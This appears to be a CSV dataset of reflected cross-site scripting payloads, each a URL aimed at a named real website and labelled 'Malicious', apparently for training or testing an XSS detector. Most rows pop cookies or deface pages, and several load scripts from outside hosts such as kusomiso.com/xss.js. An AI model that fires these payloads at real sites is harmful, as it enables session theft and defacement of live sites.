Payloads,Class
http://phpthumb.sourceforge.net/index.php?source=%22%3e/r0hit/%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e%3cscript%20src=http://infysec.net/x.js%3e%3c/script%3e,Malicious
http://www.prenatalyogacenter.com/forums/introduce-yourself/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;,Malicious
http://www.dephut.go.id/news.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcot<br>icxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.photomoda.com/portfolio/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://macombsheriffexplorers.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gametrailers.com/gameplay.php?order_by=date+desc%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6<br>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32<br>%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%<br>34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.jesushousedc.org/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.independent.co.uk/search/simple.do?publicationid=55&amp;includesectionid=38&amp;xsuccessurl=index<br>.jsp%3ftemplatename%3dresult&amp;xerrorurl=index.jsp%3ftemplatename%3dresult&amp;searchenginename=lucysearch<br>1&amp;includesubsections=true&amp;pagelength=25&amp;articletype=news&amp;sortstring=by_date_desc&amp;maxrows=500&amp;searchs<br>tring=%3cscript%3ealert%28%22by-panzerturk-xss%22%29%3c%2fscript%3e,Malicious
https://www.itfor.co.jp/forms/prv-policy-kakunin.asp?url='%3e%22%3e%3cscript/src=http://kusomiso.com<br>/xss.js%3e%3c/script%3e,Malicious
"http://www.neoseeker.com/redirector.php?url=%0ahttp://asdf.com%3f%22%3e%3cscript%3ealert(string.from<br>charcode(88,83,83))%3c/script%3e%3cx",Malicious
http://freepornsite.tv/webpages/search.php?input=%22%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://caloriecount.about.com/cc/search.php?searchpro=%3cbody%20onload=alert(1)%3e&search_type=foods,Malicious
http://www.mediabistro.com/events/mediaevents.asp?ftit=%22';%3c/script%3e%22%3e%3cscript%3ealert(doc<br>ument.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,Malicious
https://winelibrary.com/show_special.asp?section=2006bordeauxddd%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e,Malicious
http://www.fdp-main-tauber.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://docbweb.ispa.pt/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://mediacenter.corriere.it/mediacenter/action/player?uuid=%22%3e%3cscript%3ealert%28%2fxss+by+re<br>dtuning%2f%29%3b%3c%2fscript%3e&amp;idcanale=italia&amp;idcanaleadv=cronache,Malicious
http://www.resimyuklet.com/resim.php?cg=uploads2/load106322.png&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious
http://www.2amicro.com/boutique/achat/recherche.php?motclef=%3c%3cscript%3ealert(%22resistance%22);/<br>/%3c%3c/script%3e,Malicious
http://www.suichuan.gov.cn/dy_readopinion.asp?opinionid=116%27%22%3e%3c/title%3e%3cscript%3ealert(13<br>37)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.e-health.gov.gr/simplesearch.asp?keyword=%3cscript%3ealert%28string.fromcharcode%2883%2c1<br>16%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3<br>c%2fh1%3e%3c%2fmarquee%3e&amp;section=1,Malicious
http://www.ro2.jp/search/index.php?mixquery=xss_by_kusomiso.com&amp;mixreqid='%3e%22%3e%3cscript/src=htt<br>p://kusomiso.com/xss.js%3e%3c/script%3e&amp;charset=shift_jis&amp;mixaction=newsearch&amp;submit.x=27&amp;submit.y=1<br>8&amp;submit=%b8%a1%ba%f7,Malicious
http://firept-up.servegame.com:8090/painel/existe.php?id=http://firept-up.servegame.com:8090/painel/<br>existe.php?id=%3cscript%3ealert%28%22xssed%20by:%20d4rkweaver%22%29%3c/script%3e%3cembed%20src=%22ht<br>tp://casa-alves.com/xss.swf%22%20width=%220%22%20height=%220%22%3e%20%3ccenter%3e%3cimg%20src=%22htt<br>p://mob615.photobucket.com/albums/tt237/joaosilas/linux-logo1.jpg%22%3e%3c/center%3e%3ciframe%20src=<br>%22http://casa-alves.com/xss.html%22%20width=%221248%22%20height=%22450%22%3e,Malicious
http://www.ogame.com.es/register.php?lang=de&amp;result=mistake&amp;error[0]=nr27&amp;error[1]=nr26&amp;error[2]=nr2<br>5&amp;error[3]=nr23&amp;uni_name=9&amp;character=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;&amp;email=&amp;try=2&amp;errornam<br>e=1&amp;errormail=1&amp;erroragb=1&amp;errorpw=1,Malicious
http://www2.pref.kyoto.lg.jp/cgi-bin/namazu.cgi?q=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomis<br>o%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;p=4&amp;n=20&amp;s=200&amp;o=0,Malicious
http://blogs.sfweekly.com/search.php?tag=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e%3<br>cimg%20src=%20%22http://img406.imageshack.us/img406/448/rahmisfm9.png%22%3e6--%3e,Malicious
http://icwestlothian.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.<br>org/)%3c/script%3e%3cp,Malicious
http://catalogue.adidas.com/adidaspc/hold.jsp?locale=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/tit<br>le%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3eno<br>rehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.ci<br>bernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersa<br>in.iespana.es/xss.html%20%3c&amp;country=es&amp;brand=performance,Malicious
http://www.schaustellerbetrieb-scheit.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://games.espn.go.com/cgi/fba/request.dll?playerbyname&amp;param0=&lt;script&gt;alert(&quot;xss found by<br>rugburn&quot;)&lt;/script&gt;,Malicious
http://www.un.org/pubs/cyberschoolbus/infonation3/topic_blue-chart_loader.asp?cat=1&amp;stat1=73&amp;stat2=7<br>3&amp;stat3=73&amp;stat4=73&amp;stat5=73&amp;stat6=f00z&quot;&gt;&lt;script&gt;alert('xssed%20by%20sshjason');&lt;/script&gt;,Malicious
http://www.fontshop.de/search.php3?ns=1&amp;sns=0&amp;searchtype=fo-kw&amp;searchtext=%5c%22%3e%3c%2ftitle%3e%3c<br>%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e+%5c%22onmouseover%3d%5c%22alert%281%29%5c%22+onm<br>ouseover%3dalert%281%29,Malicious
http://ms126.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://gameindexer.com/ddl.php?q=%3cmarquee%3ewhere%3c/marquee%3e,Malicious
http://www.e-esperanza.gov.ar/not1.php?n_id=%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,Malicious
http://www.yellowpages.co.za/search.jsp?location=&amp;query=bak%27%22%3e%3c/title%3e%3cscript%3ealert(13<br>37)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ekie&amp;search.x=1&amp;sear<br>ch.y=1,Malicious
http://ms167.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://cract.s206.xrea.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kus<br>omiso.com%22)%3c/script%3e,Malicious
"http://www.wshblaw.com/news.php?type=newsletters,updates%27%22%3e%3cimg%20src=k.png%20onerror=alert(<br>/xss/.source)%20/%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20mystick%3c/h1%3e%3c/marquee%3e",Malicious
http://www.deu.edu.tr/deuweb/duyuru/duyuru.php?mesaj_id=210381&amp;duyuru_id=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://chat6.funradio.fr/funradio_popup_login.php?login=funradio&amp;nick=%22%3e%3cmarquee%3edefaced%20b<br>y%20sponsfull%3c/marquee%3e,Malicious
http://www.valuengine.com/pub/velogin?l=y910&amp;callurl=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%7<br>2%74%28%27%58%73%73%27%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.mdsmp.gob.pe/contenidos_ver2.php?cod=%3cscript%3ealert(document.cookie)&lt;/script&gt;,Malicious
http://djplexx.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://ubitv.de.ubi.com/index.php?vid=419&amp;listsort=3&amp;theme_id=0&amp;pid=0&amp;games_id=47&amp;side=1%27%22%3e%3c<br>script%3ealert%28string.fromcharcode%2888,83,83,69,68,32,98,121,32,86,105,112,101,114,46,97,84%29%29<br>%3c/script%3e",Malicious
http://www.picpiggy.com/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
http://it.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.dorukkayaotel.com/kayakgallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fbcpalmdale.org/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.avellaneda-ba.gov.ar/index.php?idcateg=50&amp;level=%22%3e%3ciframe%20onload=alert%28/xss/%29<br>%3e,Malicious
http://www.abac-usa.org/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://forum.wgbh.org/wgbh/forum.php?category=+select+series}%3c/style%3e%3cscript%3ea=eval;b=alert;<br>a(b(/xss/.source));%3c/script%3e,Malicious
http://www.nicsohs.gov.uk/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://my.opera.com/community/rss/standalone.pl?url=1%3c%2ftitle%3e1%3cscript%20%3eprompt%28995503%2<br>9%3c%2fscript%3e,Malicious
http://zones.computerworld.com/dell_le/registration.php?item=14&amp;tab=%22%3e%3cscript%3ealert(%22rogun<br>ix%22)%3c/script%3e,Malicious
http://www4.army.mil/search/index.php?search=%3cscript%3ealert(%22xss%20by%20mrdoug%22)%3c%2fscript%<br>3e,Malicious
http://www.linuxdevices.com/cgi-bin/search_view.cgi?snews=checked&amp;sarticle=checked&amp;sk=%22%3e%3cscrip<br>t%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;st=all&amp;view=search&amp;ss=newest,Malicious
http://www.sophos.com/products/small-business/sophos-security-suite/eval?field_platforms=1&amp;field_for<br>ename=xss+here%22%3e%3cscript%3ealert%28%22xss0%22%29%3c%2fscript%3e%3cx+&amp;field_surname=xss+here%22%<br>3e%3cscript%3ealert%28%22xss1%22%29%3c%2fscript%3e%3cx+,Malicious
https://store.playstation.com/accounts/register/reg_privacy_policy.vm?returnurl=reg_expl%27%22%3e%3c<br>/title%3e%3cscript%3ealert(/1337ssl/)%3c/script%3eain.vm&amp;choose=1,Malicious
http://bonsoleil.mine.nu/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e,Malicious
http://www.akamai.cn/enzs/html/awe/login.html?campaign_id=%22%3ebusindre%3cscript%3ealert(document.c<br>ookie)%3c/script%3e&amp;curl=/enes/dl/whitepapers/how_will_the_internet_scale.pdf,Malicious
http://www.coolchaser.com/message/result?cx=partner-pub-3755072543989337%3a8qqgxc-zarb&amp;cof=forid%3a1<br>0&amp;ie=iso-8859-1&amp;q=%22%3e%27%3e%3ciframe+src%3djavascript%3aalert(123)%3e&amp;sa=go,Malicious
http://legal-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie<br>)%3b%3c%2fscript%3e,Malicious
http://icuxbridge.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br>/)%3c/script%3e%3cp,Malicious
http://www.thesun.co.uk/_nipd/sunlogin.php?grid=43&amp;uri=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74<br>%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious
http://docweb.estesl.ipl.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;sea<br>rchtxt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://akb.sytes.net/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomi<br>so.com%22)%3c/script%3e,Malicious
http://tool-6.net/edit.cgi?id=sadsadapwq&amp;mode=logincheck&amp;yourp=1234%22%3e'%3e%3cscript%3ealert('x')%<br>3c/script%3e,Malicious
http://www.educacion.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.qualitech.info/buscar_resultado.php?busca=%3cscript%3ealert%28document.cookie%29%3c%2fscr<br>ipt%3e,Malicious
http://www.flexerasoftware.com/partners/channel/find-reseller.asp?country=australia%27%22%3e%3c/titl<br>e%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
"http://www.upu.int/query/upusearchen.jsp?p_action=search&amp;p_all=&amp;p_phrase=&amp;p_any=&amp;p_none=&amp;p_language=<br>&amp;p_format=htm&amp;p_results=';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\';alert(<br>string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(string.fromcharcode(83,69,67,85<br>,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//--<br>%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88)<br>)%3c/script%3e",Malicious
http://store.steampowered.com/search/?developer=valve%27%22%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious
http://www.amw.com/advanced_search/search.cfm?search='&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://www.eastbay.com/catalog/advancedsearch/brand--elwood/%22%3e%3cscript%3ealert(/xss/)%3c/script<br>%3e,Malicious
http://forestry.lib.umn.edu/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmar<br>quee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.armeniansingles.com/sa.php?nowstage=8&amp;nowpage=71&amp;age1=21&amp;age2=%27%27%3cscript%3ealert%28%<br>22xssed%22%29%3c/script%3e&amp;to=2,Malicious
http://www.programas-gratis.net/php/buscador1.php?buscar=%3e%22%3e%3cscript%3ealert('norehem%20was%2<br>0here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%<br>3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/<br>norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://lenta.ru/search?search=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.infusionconnections.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script<br>&gt;,Malicious
http://walkmyplank.net/signup.php?ref=%22%3e%3ciframe%20src=http://google.com%3e%3cfont%20color=red%<br>3e,Malicious
http://www.saltrivercove.com/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.eatevansville.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://search.supereva.com/cgi-bin/p_gsearch.chm?sefull=1&amp;lr=lang_it&amp;hl=it&amp;motore=4&amp;q=%3cscript%3eal<br>ert('0ssi3_tr')%3c/script%3e,Malicious
http://www.php.documentation.givah.net/?p=--%3e%3c/title%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ironz<br>org%3c/h1%3e%3c/marquee%3e,Malicious
http://www.andywangmusic.com/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.comune.poggiobustone.ri.it/galleria/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://bbs.hld.gov.cn/loginout.cgi?forum=32%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53<br>%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%<br>31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2<br>c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.investor.reuters.com/404.aspx?nss=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;aspxerrorpath=%<br>2fgoto.aspx%3fnss%3ddsa&amp;page=pagenotfound,Malicious
http://www.aip.org/ptbg/search.jsp%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e<br>%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://sport.pravda.sk/fed-cup-slovenky-opat-narazia-na-cesky-dxr-/mail.asp?c=%22%3e%3cbody+onload=a<br>lert(%22by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20enco<br>re%20%3c/h2%3e,Malicious
http://www.suluovakml.k12.tr/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cadoons-boutique.com/pages/?all=recherche&amp;idl=21/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;x=17&amp;y=8,Malicious
http://www.llsc.com/photo_album/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms114.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://download.jeuxvideo.com/cgi-bin/admin/ftp_start.cgi?nom=callofduty416mappack%5fjeuxvideo%2ecom<br>%5f13726%2ezip&amp;date=1212756262%22%3e%3cscript%3ealert('xss%20by%20\nxylitol')%3c/script%3e%3e%3cmarq<br>uee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;id=286a223d61d506535586074dd63627cb&amp;numero=0<br>0013726&amp;type=p%22%3e%3cscript%3ealert('xss%20by%20\nxylitol')%3c/script%3e%3e%3cmarquee%3e%3ch1%3exs<br>s%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://movie.msn.co.kr/movinfo/movie_review.html?movie_id=19904%22%3e%3cscript%3ealert(1)%3c/script%<br>3e,Malicious
http://www.batman-bld.gov.tr/habergoster.asp?id=1%22%3e%3clink%20href=http://starext.by.ru/css.css%2<br>0type=text/css%20rel=stylesheet%3e,Malicious
http://www.tupperware.co.kr/event/event_01_02.html?idx=208&amp;num=108&amp;page=1&amp;findstring=%27%22%3e%3c/ti<br>tle%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/mar<br>quee%3e,Malicious
http://www.tahiraydogdu.com/fan/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;x<br>ssedbycicosz&quot;)&lt;/script&gt;,Malicious
http://yellowpages.superpages.com/listings.jsp?src=lycos6&amp;cb=&amp;cs=l&amp;mcbp=true&amp;r=n&amp;stype=s&amp;c=uber0n&amp;n=<br>&amp;l=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27&amp;ps=15&amp;search=find+it,Malicious
http://www.freehotsurf.com/nph-fhs.cgi/000010b/https/server.iad.liveperson.net/hc/39919712/x.js=&quot;&gt;&lt;s<br>cript&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.marsrutai.lt/vilnius/?a=%22%3cscript%3ealert(7);%3c/script%3e&amp;schedule_id=%22%3cscript%3e<br>alert(7);%3c/script%3e&amp;t='xhtml&amp;l=lt,Malicious
http://www.eyrolles.com/entreprise/theme/952/fonction-publique/preparation-aux-concours-administrati<br>fs/categories-b---c.php?xd=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://search.harvard.edu:8765/query.html?charset=iso-8859-1&amp;qp=url%3awww.allston.harvard.edu&amp;qt=ss%<br>2c&amp;oldqt=%3cscript%3ealert('xssed\n\nby\n\ndr.optix')%3c/script%3e%2c,Malicious
"http://morriscenter.ticketforce.com/orderticketsarea.asp?p=296&amp;a=349&amp;backurl=';alert(string.fromchar<br>code(88,83,83))//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;<br>;alert(string.fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;<br>/script&gt;",Malicious
http://www.real.com/realone/trial_terms.html?src=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
"http://www.lindenlab.gbh.com/search_results.asp?txtsearchparamtxt=';alert(string.fromcharcode(88,83,<br>83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(<br>string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88<br>,83,83))%3c/script%3e&amp;txtsearchparamcat=all&amp;txtsearchparamtype=all&amp;ilevel=1&amp;txtsearchparamman=all&amp;tx<br>tsearchparamven=all&amp;txtfromsearch=fromsearch&amp;btnsearch.x=0&amp;btnsearch.y=0",Malicious
http://www.ea.com/official/godfather/godfather/us/scripts/sound_js.inc?page=&quot;&gt;&lt;script&gt;alert('arham<br>muhammad')&lt;/script&gt;,Malicious
http://www.yalovaguneykoymuhtarligi.gov.tr/galeri/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms123.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
"http://www.interface-online.org.uk/view_item.aspx?custom=feedback/event&amp;item_id=2987&amp;item_name=can%2<br>0do,%20will%20do%20-%20entrepreneurs%20in%20action%20(aviemore)&amp;item_date=19/11/2007&amp;address=aviemor<br>e%20highland%20resort}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e",Malicious
http://mail.hdais.gov.tw/info.sphp?a[]=%3e%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious
"http://www.artchesul.com.br/site/views/produto/produto.php?id=136%22%3e%3cscript%3ealert%28string.fr<br>omcharcode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3c/script%3e",Malicious
http://www.safercar.gov/index2.cfm?myclass=&amp;myyear=&amp;mymake='%3e%22%3e%3cscript/src=http://kusomiso.c<br>om/xss.js%3e%3c/script%3e&amp;mymodel=&amp;gobutton=select+a+class+of+vehicle,Malicious
http://channels.netscape.com/pf/lookup.jsp?issuetype=1005&amp;nameorts=1&amp;lookupvalue=%3cscript%3ealert%2<br>8%22xss | hexspirit%22%29%3c%2fscript%3e,Malicious
http://www.deremate.cl/chile/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://img.new-bytes.net/viewer.php?id='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
